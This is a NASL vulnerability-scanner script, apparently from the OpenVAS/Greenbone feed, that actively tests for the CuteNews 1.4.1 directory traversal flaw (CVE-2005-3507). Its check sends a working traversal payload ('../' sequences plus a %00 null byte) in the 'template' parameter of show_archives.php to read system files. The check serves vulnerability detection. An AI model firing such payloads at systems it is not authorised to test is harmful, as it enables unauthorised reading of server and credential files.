# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# Ref: retrogod at aliceposta.it

CPE = "cpe:/a:cutephp:cutenews";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20137");
  script_version("2025-07-18T15:43:33+0000");
  script_tag(name:"last_modification", value:"2025-07-18 15:43:33 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3507");
  script_xref(name:"OSVDB", value:"20472");
  script_xref(name:"OSVDB", value:"20473");
  script_xref(name:"OSVDB", value:"20474");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("CuteNews 1.4.1 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("cutenews_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cutenews/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20070911101908/http://retrogod.altervista.org/cute141.html");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121164732/http://www.securityfocus.com/bid/15295");

  script_tag(name:"summary", value:"CuteNews is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The version of CuteNews installed on the remote host fails to
  sanitize user-supplied input to the 'template' parameter of the 'show_archives.php' and
  'show_news.php' scripts.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to read arbitrary files and
  possibly even execute arbitrary PHP code on the remote host, subject to the privileges of the web
  server user id.");

  script_tag(name:"solution", value:"Update to the latest version.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern (keys(files)) {

  file = files[pattern];
  url = dir + "/show_archives.php?template=../../../../../../../../../" + file + "%00";

  req = http_get(item: url, port: port);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
  if(!res)
    continue;

  if(egrep(pattern: pattern, string: res)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
